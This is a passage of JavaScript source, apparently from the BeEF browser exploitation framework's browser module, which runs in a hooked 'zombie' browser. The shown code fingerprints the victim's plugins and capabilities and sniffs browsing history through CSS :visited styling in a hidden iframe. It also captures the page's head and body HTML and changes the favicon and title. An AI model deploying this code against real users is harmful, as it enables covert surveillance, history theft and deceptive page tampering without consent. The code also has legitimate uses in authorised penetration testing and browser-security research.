        if (touch_enabled) details['hardware.screen.touchenabled'] = touch_enabled;

        if (vbscript_enabled) details['browser.capabilities.vbscript'] = vbscript_enabled;
        if (has_flash) details['browser.capabilities.flash'] = has_flash;
        if (has_silverlight) details['browser.capabilities.silverlight'] = has_silverlight;
        if (has_phonegap) details['browser.capabilities.phonegap'] = has_phonegap;
        if (has_web_socket) details['browser.capabilities.websocket'] = has_web_socket;
        if (has_webrtc) details['browser.capabilities.webrtc'] = has_webrtc;
        if (has_web_worker) details['browser.capabilities.webworker'] = has_web_worker;
        if (has_web_gl) details['browser.capabilities.webgl'] = has_web_gl;
        if (has_googlegears) details['browser.capabilities.googlegears'] = has_googlegears;
        if (has_activex) details['browser.capabilities.activex'] = has_activex;
        if (has_quicktime) details['browser.capabilities.quicktime'] = has_quicktime;
        if (has_realplayer) details['browser.capabilities.realplayer'] = has_realplayer;
        if (has_wmp) details['browser.capabilities.wmp'] = has_wmp;
        if (has_vlc) details['browser.capabilities.vlc'] = has_vlc;

        return details;
    },

    /**
     * Returns boolean value depending on whether the browser supports ActiveX
     */
    hasActiveX: function () {
        return !!window.ActiveXObject;
    },

    /**
     * Returns boolean value depending on whether the browser supports WebRTC
     */
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    /**
     * Returns boolean value depending on whether the browser supports Silverlight
     */
    hasSilverlight: function () {
        var result = false;

        try {
            if (beef.browser.hasActiveX()) {
                var slControl = new ActiveXObject('AgControl.AgControl');
                result = true;
            } else if (navigator.plugins["Silverlight Plug-In"]) {
                result = true;
            }
        } catch (e) {
            result = false;
        }

        return result;
    },

    /**
     * Returns array of results, whether or not the target zombie has visited the specified URL
     */
    hasVisited: function (urls) {
        var results = new Array();
        var iframe = beef.dom.createInvisibleIframe();
        var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
        ifdoc.open();
        ifdoc.write('<style>a:visited{width:0px !important;}</style>');
        ifdoc.close();
        urls = urls.split("\n");
        var count = 0;
        for (var i in urls) {
            var u = urls[i];
            if (u != "" || u != null) {
                var success = false;
                var a = ifdoc.createElement('a');
                a.href = u;
                ifdoc.body.appendChild(a);
                var width = null;
                (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
                if (width == '0px') {
                    success = true;
                }
                results.push({'url': u, 'visited': success});
                count++;
            }
        }
        beef.dom.removeElement(iframe);
        if (results.length == 0) {
            return false;
        }
        return results;
    },

    /**
     * Checks if the zombie has Web Sockets enabled.
     * @return: {Boolean} true or false.
     * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
     * */
    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },

    /**
     * Checks if the zombie has Web Workers enabled.
     * @return: {Boolean} true or false.
     * */
    hasWebWorker: function () {
        return (typeof(Worker) !== "undefined");
    },

    /**
     * Checks if the zombie has WebGL enabled.
     * @return: {Boolean} true or false.
     *
     * @from: https://github.com/idofilin/webgl-by-example/blob/master/detect-webgl/detect-webgl.js
     * */
    hasWebGL: function () {
        try {
            var canvas = document.createElement("canvas");
            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
            return !!(gl && gl instanceof WebGLRenderingContext);
        } catch(e) {
            return false;
        }
    },

    /**
     * Checks if the zombie has Google Gears installed.
     * @return: {Boolean} true or false.
     *
     * @from: https://code.google.com/apis/gears/gears_init.js
     * */
    hasGoogleGears: function () {

        var ggfactory = null;

        // Chrome
        if (window.google && google.gears) return true;

        // Firefox
        if (typeof GearsFactory != 'undefined') {
            ggfactory = new GearsFactory();
        } else {
            // IE
            try {
                ggfactory = new ActiveXObject('Gears.Factory');
                // IE Mobile on WinCE.
                if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
                    ggfactory.privateSetGlobalObject(this);
                }
            } catch (e) {
                // Safari
                if ((typeof navigator.mimeTypes != 'undefined')
                    && navigator.mimeTypes["application/x-googlegears"]) {
                    ggfactory = document.createElement("object");
                    ggfactory.style.display = "none";
                    ggfactory.width = 0;
                    ggfactory.height = 0;
                    ggfactory.type = "application/x-googlegears";
                    document.documentElement.appendChild(ggfactory);
                    if (ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
                }
            }
        }
        if (!ggfactory) return false; else return true;
    },

    /**
     * Checks if the zombie has Foxit PDF reader plugin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFoxit()) { ... }
     * */
    hasFoxit: function () {

        var foxitplugin = false;

        try {
            if (beef.browser.hasActiveX()) {
                var foxitControl = new ActiveXObject('FoxitReader.FoxitReaderCtl.1');
                foxitplugin = true;
            } else if (navigator.plugins['Foxit Reader Plugin for Mozilla']) {
                foxitplugin = true;
            }
        } catch (e) {
            foxitplugin = false;
        }

        return foxitplugin;
    },

    /**
     * Returns the page head HTML
     **/
    getPageHead: function () {
        var html_head;
        try {
            html_head = document.head.innerHTML.toString();
        } catch (e) {
        }
        return html_head;
    },

    /**
     * Returns the page body HTML
     **/
    getPageBody: function () {
        var html_body;
        try {
            html_body = document.body.innerHTML.toString();
        } catch (e) {
        }
        return html_body;
    },

    /**
     * Dynamically changes the favicon: works in Firefox, Chrome and Opera
     **/
    changeFavicon: function (favicon_url) {
        var iframe = null;
        if (this.isC()) {
            iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
        }
        var link = document.createElement('link'),
            oldLink = document.getElementById('dynamic-favicon');
        link.id = 'dynamic-favicon';
        link.rel = 'shortcut icon';
        link.href = favicon_url;
        if (oldLink) document.head.removeChild(oldLink);
        document.head.appendChild(link);
        if (this.isC()) iframe.src += '';
    },

    /**
     * Changes page title
     **/
    changePageTitle: function (title) {
        document.title = title;
    },

    /**
     * Get the browser language
     */
    getBrowserLanguage: function () {
        var l = 'Unknown';
        try {
            l = window.navigator.userLanguage || window.navigator.language;
        } catch (e) {
        }
        return l;
    },

    /**
     *  A function that gets the max number of simultaneous connections the
     *  browser can make per origin, or globally on all origin.
     *
     *  This code is based on research from browserspy.dk
     *
     * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
     * @return {Object} A jQuery deferred object promise, which when resolved passes
     *    the number of connections to the callback function as "this"
     */



    getMaxConnections: function (scope) {
        /*
        *    example usage:
        *        $j.when(getMaxConnections()).done(function(){
        *            console.debug("Max Connections: " + this);
        *            }); 
        */
        var imagesCount = 30;		// Max number of images to test
        var secondsTimeout = 5;		// Image load timeout threashold
        var testUrl = "";		// The image testing service URL

        // User broserspy.dk max connections service URL.
        if (scope == 'PER_DOMAIN')
            testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
        else
            // The token will be replaced by a different number with each request (different origin).
            testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";

        var imagesLoaded = 0;			// Number of responding images before timeout.
        var imagesRequested = 0;		// Number of requested images.
        var testImages = new Array();		// Array of all images.
        var deferredObject = $j.Deferred();	// A jquery Deferred object.

        for (var i = 1; i <= imagesCount; i++) {
            // Asynchronously request image.
            testImages[i] =
                $j.ajax({
                    type: "get",
                    dataType: true,
                    url: (testUrl.replace("<token>", i)) + Math.random(),
                    data: "",
                    timeout: (secondsTimeout * 1000),

                    // Function on completion of request.
                    complete: function (jqXHR, textStatus) {

                        imagesRequested++;

                        // If the image returns a 200 or a 302, the text Status is "error", else null
                        if (textStatus == "error") {
                            imagesLoaded++;
                        }

                        // If all images requested
                        if (imagesRequested >= imagesCount) {
                            // resolve the deferred object passing the number of loaded images.
                            deferredObject.resolveWith(imagesLoaded);
                        }
                    }
                });

        }

        // Return a promise to resolve the deffered object when the images are loaded.
        return deferredObject.promise();

    }

};

beef.regCmp('beef.browser');
